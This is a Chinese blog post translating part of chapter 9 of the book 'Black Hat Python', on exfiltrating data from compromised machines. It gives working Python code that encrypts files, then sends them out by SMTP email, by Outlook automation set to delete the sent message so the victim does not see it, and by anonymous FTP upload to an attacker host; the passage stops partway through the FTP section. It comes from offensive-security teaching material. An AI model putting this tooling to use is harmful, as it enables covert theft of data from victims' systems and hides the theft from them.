<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Black Hat Python 2nd 9 | Ma9icCR</title><meta name="description" content="FUN WITH EXFILTRATION–数据泄露的乐趣进入目标网络只是战斗的一部分。为了利用您的访问权限，您希望能够从目标系统中导出文档、电子表格或其他数据。根据防御机制的不同，攻击的最后一部分可能会很棘手。可能有本地或远程系统(或两者的组合)来验证打开远程连接的进程，以及确定这些进程是否能够在内部网络之外发送信息或发起连接。 在本章中，我们将创建工具，使您能够导出加密数据。首先，我们将编写一"><meta name="keywords" content="Black_Hat_Python_2nd"><meta name="author" content="Ma9icCR"><meta name="copyright" content="Ma9icCR"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ma9iccr.github.io/2021-07/Black-Hat-Python-2nd-9/"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta property="og:type" content="article"><meta property="og:title" content="Black Hat Python 2nd 9"><meta property="og:url" content="https://ma9iccr.github.io/2021-07/Black-Hat-Python-2nd-9/"><meta property="og:site_name" content="Ma9icCR"><meta property="og:description" content="FUN WITH EXFILTRATION–数据泄露的乐趣进入目标网络只是战斗的一部分。为了利用您的访问权限，您希望能够从目标系统中导出文档、电子表格或其他数据。根据防御机制的不同，攻击的最后一部分可能会很棘手。可能有本地或远程系统(或两者的组合)来验证打开远程连接的进程，以及确定这些进程是否能够在内部网络之外发送信息或发起连接。 在本章中，我们将创建工具，使您能够导出加密数据。首先，我们将编写一"><meta property="og:image" content="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><meta property="article:published_time" content="2021-07-18T05:13:33.000Z"><meta property="article:modified_time" content="2022-03-28T07:20:42.690Z"><meta name="twitter:card" content="summary"><script>var activateDarkMode = function () {
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#000')
  }
}
var activateLightMode = function () {
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff')
  }
}

var getCookies = function (name) {
  const value = `; ${document.cookie}`
  const parts = value.split(`; ${name}=`)
  if (parts.length === 2) return parts.pop().split(';').shift()
}

var autoChangeMode = 'false'
var t = getCookies('theme')
if (autoChangeMode === '1') {
  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined) {
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport) {
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour <= 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
    }
    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
      if (Cookies.get('theme') === undefined) {
        e.matches ? activateDarkMode() : activateLightMode()
      }
    })
  } else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else if (autoChangeMode === '2') {
  now = new Date()
  hour = now.getHours()
  isNight = hour <= 6 || hour >= 18
  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else {
  if (t === 'dark') activateDarkMode()
  else if (t === 'light') activateLightMode()
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="prev" title="Black Hat Python 2nd 10" href="https://ma9iccr.github.io/2021-07/Black-Hat-Python-2nd-10/"><link rel="next" title="Black Hat Python 2nd 8" href="https://ma9iccr.github.io/2021-07/Black-Hat-Python-2nd-8/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  baiduPush: false,
  highlightCopy: true,
  highlightLang: true,
  isPhotoFigcaption: false,
  islazyload: true,
  isanchor: false    
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isSidebar: true,
  postUpdate: '2022-03-28 15:20:42'
}</script><noscript><style>
#nav {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript><meta name="generator" content="Hexo 4.2.1"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">35</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">13</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">10</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page" href="/images/"><i class="fa-fw fas fa-image"></i><span> Image</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/navigate/"><i class="fa-fw fas fa-navigate"></i><span> Navigate</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#FUN-WITH-EXFILTRATION–数据泄露的乐趣"><span class="toc-number">1.</span> <span class="toc-text">FUN WITH EXFILTRATION–数据泄露的乐趣</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#加密和解密文件"><span class="toc-number">1.1.</span> <span class="toc-text">加密和解密文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#电子邮件泄露数据"><span class="toc-number">1.2.</span> <span class="toc-text">电子邮件泄露数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件传输泄露数据"><span class="toc-number">1.3.</span> <span class="toc-text">文件传输泄露数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-服务器泄露数据"><span class="toc-number">1.4.</span> <span class="toc-text">Web 服务器泄露数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#把它们结合在一起"><span class="toc-number">1.5.</span> <span class="toc-text">把它们结合在一起</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kicking-the-Tires"><span class="toc-number">1.5.1.</span> <span class="toc-text">Kicking the Tires</span></a></li></ol></li></ol></li></ol></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg)"><nav id="nav"><span class="pull-left" id="blog_name"><a class="blog_title" id="site-name" href="/">Ma9icCR</a></span><span class="pull-right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page" href="/images/"><i class="fa-fw fas fa-image"></i><span> Image</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/navigate/"><i class="fa-fw fas fa-navigate"></i><span> Navigate</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">Black Hat Python 2nd 9</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2021-07-18 13:13:33"><i class="far fa-calendar-alt fa-fw"></i> 发表于 2021-07-18</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2022-03-28 15:20:42"><i class="fas fa-history fa-fw"></i> 更新于 2022-03-28</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fas fa-inbox fa-fw post-meta__icon"></i><a class="post-meta__categories" href="/categories/books/">books</a></span></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta__icon"></i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="FUN-WITH-EXFILTRATION–数据泄露的乐趣"><a href="#FUN-WITH-EXFILTRATION–数据泄露的乐趣" class="headerlink" title="FUN WITH EXFILTRATION–数据泄露的乐趣"></a>FUN WITH EXFILTRATION–数据泄露的乐趣</h1><p>进入目标网络只是战斗的一部分。为了利用您的访问权限，您希望能够从目标系统中导出文档、电子表格或其他数据。根据防御机制的不同，攻击的最后一部分可能会很棘手。可能有本地或远程系统(或两者的组合)来验证打开远程连接的进程，以及确定这些进程是否能够在内部网络之外发送信息或发起连接。</p>
<p>在本章中，我们将创建工具，使您能够导出加密数据。首先，我们将编写一个脚本来加密和解密文件。然后，我们将使用该脚本加密信息，并通过使用三种方法从系统中传输信息:电子邮件、文件传输和发布到web服务器。对于这些方法中的每一种，我们都将编写一个各平台通用的工具和一个仅适用于 Windows 的工具。</p>
<p>对于仅限于 Windows 的函数，我们将依赖于我们在第8章中使用的 <em>PyWin32</em> 库，尤其是 <em>win32com</em> 包。 Windows COM (Component Object Model，组件对象模型)自动化有许多实际用途——从与基于网络的服务交互到将微软 Excel 电子表格嵌入到您自己的应用程序中。从 XP 开始，所有版本的 Windows 都允许您将 Internet Explorer COM 对象嵌入到应用程序中，我们将在本章中利用这一能力。</p>
<h2 id="加密和解密文件"><a href="#加密和解密文件" class="headerlink" title="加密和解密文件"></a>加密和解密文件</h2><p>我们将使用 <em>pycryptodomex</em> 包来完成加密任务。您可以使用以下命令安装它:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pip install pycryptodomex</span><br></pre></td></tr></table></figure>

<p>现在，打开 <em>cryptor.py</em> ，让我们导入开始使用所需的库:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>] <span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> AES, PKCS1_OAEP</span><br><span class="line">[<span class="number">2</span>] <span class="keyword">from</span> Cryptodome.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> zlib</span><br></pre></td></tr></table></figure>

<p>我们将创建一个混合加密进程，使用对称和非对称加密来实现两全其美的效果。AES 密码是对称加密的一个例子[1]:它之所以被称为 <em>symmetric</em> (对称) 是因为它使用同一个密钥进行加密和解密。它速度非常快，可以处理大量的文本。这就是我们用来加密我们想要泄露的信息的加密方法。</p>
<p>我们还导入了使用公钥/私钥技术的 <em>asymmetric</em> (非对称) RSA 密码[2]。它依赖一个密钥进行加密(通常是公钥)，另一个密钥进行解密(通常是私钥)。我们将使用这个密码来加密 AES 加密中使用的单个密钥。非对称加密非常适合于少量信息，非常适合加密 AES 密钥。</p>
<p>这种同时使用两种加密方式的方法被称为 <em>hybrid system</em> (混合系统)，非常常见。例如，您的浏览器和web服务器之间的 TLS 通信就涉及一个混合系统。</p>
<p>在开始加密或解密之前，我们需要为非对称加密 RSA 创建公钥和私钥。也就是说，我们需要创建一个 RSA 密钥生成函数。让我们从向 <em>cryptor.py</em> 添加一个 <em>generate</em> 函数开始:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">()</span>:</span></span><br><span class="line">    new_key = RSA.generate(<span class="number">2048</span>)</span><br><span class="line">    private_key = new_key.exportKey()</span><br><span class="line">    public_key = new_key.publickey().exportKey()</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'key.pri'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(private_key)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'key.pub'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(public_key)</span><br></pre></td></tr></table></figure>

<p>没错——Python非常“坏”，我们只需几行代码就能做到这一点。这段代码在名为 <em>key.pri</em> 和 <em>key.pub</em> 的文件中输出了一个私钥和公钥对。现在让我们创建一个小的辅助函数，这样我们就可以获取公钥或私钥:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_rsa_cipher</span><span class="params">(keytype)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">f'key.<span class="subst">&#123;keytype&#125;</span>'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        key = f.read()</span><br><span class="line">    rsakey = RSA.importKey(key)</span><br><span class="line">    <span class="keyword">return</span> (PKCS1_OAEP.new(rsakey), rsakey.size_in_bytes())</span><br></pre></td></tr></table></figure>

<p>我们将密钥类型 (pub 或 pri) 传递给这个函数，读取相应的文件，并返回密码对象和 RSA 密钥的大小(以字节为单位的)。</p>
<p>现在，我们已经生成了两个密钥，并且具有从生成的密钥返回 RSA 密码的功能，让我们继续加密数据:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(plaintext)</span>:</span></span><br><span class="line">[<span class="number">1</span>] compressed_text = zlib.compress(plaintext)</span><br><span class="line">[<span class="number">2</span>] session_key = get_random_bytes(<span class="number">16</span>)</span><br><span class="line">    cipher_aes = AES.new(session_key, AES.MODE_EAX)</span><br><span class="line">[<span class="number">3</span>] ciphertext, tag = cipher_aes.encrypt_and_digest(compressed_text)</span><br><span class="line">    cipher_rsa, _ = get_rsa_cipher(<span class="string">'pub'</span>)</span><br><span class="line">[<span class="number">4</span>] encrypted_session_key = cipher_rsa.encrypt(session_key)</span><br><span class="line">[<span class="number">5</span>] msg_payload = encrypted_session_key + cipher_aes.nonce + tag + ciphertext</span><br><span class="line">[<span class="number">6</span>] encrypted = base64.encodebytes(msg_payload)</span><br><span class="line">    <span class="keyword">return</span>(encrypted)</span><br></pre></td></tr></table></figure>

<p>我们将明文以字节传入，并将其压缩[1]。然后，我们生成一个用于 AES 密码的随机会话密钥[2]，并使用密码加密压缩的明文[3]。现在信息已经加密，我们需要将会话密钥作为返回的有效载荷的一部分，与密文本身一起传递，这样它就可以在另一端被解密。为了添加会话密钥，我们使用从生成的公钥生成的 RSA 密钥对其进行加密[4]。我们将解密所需的所有信息放入一个有效载荷中[5]，对其进行 base64 编码，然后返回得到的加密字符串[6]。</p>
<p>现在让我们编写 <em>decrypt</em> 函数:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(encrypted)</span>:</span></span><br><span class="line">[<span class="number">1</span>] encrypted_bytes = BytesIO(base64.decodebytes(encrypted))</span><br><span class="line">    cipher_rsa, keysize_in_bytes = get_rsa_cipher(<span class="string">'pri'</span>)</span><br><span class="line">[<span class="number">2</span>] encrypted_session_key = encrypted_bytes.read(keysize_in_bytes)</span><br><span class="line">    nonce = encrypted_bytes.read(<span class="number">16</span>)</span><br><span class="line">    tag = encrypted_bytes.read(<span class="number">16</span>)</span><br><span class="line">    ciphertext = encrypted_bytes.read()</span><br><span class="line">[<span class="number">3</span>] session_key = cipher_rsa.decrypt(encrypted_session_key)</span><br><span class="line">    cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)</span><br><span class="line">[<span class="number">4</span>] decrypted = cipher_aes.decrypt_and_verify(ciphertext, tag)</span><br><span class="line">[<span class="number">5</span>] plaintext = zlib.decompress(decrypted)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br></pre></td></tr></table></figure>

<p>为了解密，我们把加密函数的步骤反过来。首先，我们将字符串 base64 解码为字节形式[1]。然后，我们从加密的字节字符串中读取加密的会话密钥以及我们需要解密的其他参数[2]。我们使用 RSA 私钥解密会话密钥[3]，并使用该密钥用 AES 密码解密消息本身[4]。最后，我们将其解压缩为明文字节字符串[5]并返回。</p>
<p>接下来，下面的主模块让测试功能变得很容易:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">[<span class="number">1</span>] generate()</span><br></pre></td></tr></table></figure>

<p>在这一步骤中，我们生成公钥和私钥[1]。我们只是简单地调用 <em>generate</em> 函数，因为我们必须在使用它们之前生成密钥。现在我们可以编辑如下主块来使用秘钥:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    plaintext = <span class="string">b'hey there you.'</span></span><br><span class="line">[<span class="number">1</span>] print(decrypt(encrypt(plaintext)))</span><br></pre></td></tr></table></figure>

<p>生成密钥后，我们加密并解密一个小字节字符串，然后打印结果[1]。</p>
<h2 id="电子邮件泄露数据"><a href="#电子邮件泄露数据" class="headerlink" title="电子邮件泄露数据"></a>电子邮件泄露数据</h2><p>现在我们可以轻松地加密和解密信息，让我们编写函数来泄露我们已经加密的信息。打开 <em>email_exfil.py</em> ，我们将使用它通过电子邮件发送加密信息:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>] <span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">[<span class="number">2</span>] <span class="keyword">import</span> win32com.client</span><br><span class="line">[<span class="number">3</span>] smtp_server = <span class="string">'smtp.example.com'</span></span><br><span class="line">smtp_port = <span class="number">587</span></span><br><span class="line">smtp_acct = <span class="string">'tim@example.com'</span></span><br><span class="line">smtp_password = <span class="string">'seKret'</span></span><br><span class="line">tgt_accts = [<span class="string">'tim@elsewhere.com'</span>]</span><br></pre></td></tr></table></figure>

<p>我们导入 <em>smptlib</em> ，我们需要使用它完成跨平台电子邮件功能[1]。我们将使用 <em>win32com</em> 包来编写我们仅适用于 Windows 的函数[2]。要使用 SMTP 电子邮件客户端，我们需要连接到 Simple Mail Transfer Protocol (SMTP，简单邮件传输协议)服务器(如果您有一个 Gmail 帐户，<em>smtp.gmail.com</em> 可能是一个很好的例子)，因此我们指定服务器的名称，它接受连接的端口，帐户名和帐户密码[3]。接下来，让我们编写通用平台的功能函数 <em>plain_email</em> :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">plain_email</span><span class="params">(subject, contents)</span>:</span></span><br><span class="line">[<span class="number">1</span>] message = <span class="string">f'Subject: <span class="subst">&#123;subject&#125;</span>\nFrom <span class="subst">&#123;smtp_acct&#125;</span>\n'</span></span><br><span class="line">    message += <span class="string">f'To: <span class="subst">&#123;tgt_accts&#125;</span>\n\n<span class="subst">&#123;contents.decode()&#125;</span>'</span></span><br><span class="line">    server = smtplib.SMTP(smtp_server, smtp_port)</span><br><span class="line">    server.starttls()</span><br><span class="line">[<span class="number">2</span>] server.login(smtp_acct, smtp_password)</span><br><span class="line">    <span class="comment">#server.set_debuglevel(1)</span></span><br><span class="line">[<span class="number">3</span>] server.sendmail(smtp_acct, tgt_accts, message)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    server.quit()</span><br></pre></td></tr></table></figure>

<p>该函数将 <em>subject</em> 和 <em>contents</em> 作为输入，然后形成包含 SMTP 服务器数据和消息内容的消息[1]。 <em>subject</em> 可以是受害机器上包含了内容的文件的名称。 <em>contents</em> 是 <em>encrypt</em> 函数返回的加密字符串。为了增加保密性，您可以发送一个加密字符串作为消息的 <em>subject</em> 。</p>
<p>接下来，我们连接到服务器，并使用帐户名和密码登录[2]。然后我们调用 <em>sendmail</em> 函数并传入我们的帐户信息，以及发送邮件的目标帐户，最后是消息本身[3]。如果函数有任何问题，您也可以设置 <em>debuglevel</em> 属性，这样就可以在控制台上看到连接情况。</p>
<p>现在让我们编写一个特定适用于 Windows 的函数来完成相同的技术:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>] <span class="function"><span class="keyword">def</span> <span class="title">outlook</span><span class="params">(subject, contents)</span>:</span></span><br><span class="line">[<span class="number">2</span>] outlook = win32com.client.Dispatch(<span class="string">"Outlook.Application"</span>)</span><br><span class="line">    message = outlook.CreateItem(<span class="number">0</span>)</span><br><span class="line">[<span class="number">3</span>] message.DeleteAfterSubmit = <span class="literal">True</span></span><br><span class="line">    message.Subject = subject</span><br><span class="line">    message.Body = contents.decode()</span><br><span class="line">    message.To =  tgt_accts[<span class="number">0</span>]</span><br><span class="line">[<span class="number">4</span>] message.Send()</span><br></pre></td></tr></table></figure>

<p><em>outlook</em> 函数采用与 <em>plain_email</em> 函数相同的参数: <em>subject</em> 和 contents [1]。我们使用 <em>win32com</em> 包来创建 Outlook 应用程序的实例[2]，确保在提交后立即删除电子邮件[3]。这可确保受损机器上的用户不会在 “已发送邮件” 和 “已删除邮件” 文件夹中看到电子邮件。接下来，我们填充消息主题、正文和目标电子邮件地址，并将电子邮件发送出去。</p>
<p>在下面的主模块中，我们调用 <em>plain_email</em> 函数来完成对该功能的简短测试:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    plain_email(<span class="string">'test2 message'</span>, <span class="string">'attack at dawn.'</span>)</span><br></pre></td></tr></table></figure>

<p>在您使用这些功能向攻击者机器发送加密文件后，您可以打开您的电子邮件客户端，选择消息，将其复制并粘贴到新文件中。然后，您可以读取该文件，以便使用 <em>cryptor.py</em> 中的 <em>decrypt</em> 函数对其进行解密。</p>
<h2 id="文件传输泄露数据"><a href="#文件传输泄露数据" class="headerlink" title="文件传输泄露数据"></a>文件传输泄露数据</h2><p>打开一个新文件 <em>transmit_exfil.py</em> ，我们将使用它通过文件传输发送加密信息:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ftplib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> win32file</span><br><span class="line">[<span class="number">1</span>] <span class="function"><span class="keyword">def</span> <span class="title">plain_ftp</span><span class="params">(docpath, server=<span class="string">'192.168.1.203'</span>)</span>:</span></span><br><span class="line">    ftp = ftplib.FTP(server)</span><br><span class="line">[<span class="number">2</span>] ftp.login(<span class="string">"anonymous"</span>, <span class="string">"anon@example.com"</span>)</span><br><span class="line">[<span class="number">3</span>] ftp.cwd(<span class="string">'/pub/'</span>)</span><br><span class="line">[<span class="number">4</span>] ftp.storbinary(<span class="string">"STOR "</span> + os.path.basename(docpath),</span><br><span class="line">                    open(docpath, <span class="string">"rb"</span>), <span class="number">1024</span>)</span><br><span class="line">    ftp.quit()</span><br></pre></td></tr></table></figure>

<p>我们导入 ftplib 和 win32file ，前者用于跨平台的函数，后者用于特定于 Windows 的函数。</p>
<p>作者设置 Kali 攻击者机器启用 FTP 服务器并接受匿名文件上传。在 <em>plain_ftp</em> 函数中，我们传入要传输的文件的路径 (<em>docpath</em>) 和 <em>server</em> 变量代指的 FTP 服务器( Kali 机器)的 IP 地址[1]。</p>
<p>使用 Python <em>ftplib</em> 可以轻松创建到服务器的连接，登录[2]，并导航到目标目录[3]。最后，我们将文件写入目标目录[4]。</p>
<p>编写 <em>transmit</em> 函数来创建特定于 Windows 的版本，该函数获取我们要传输的文件的路径 (<em>document_path</em>) :</p>
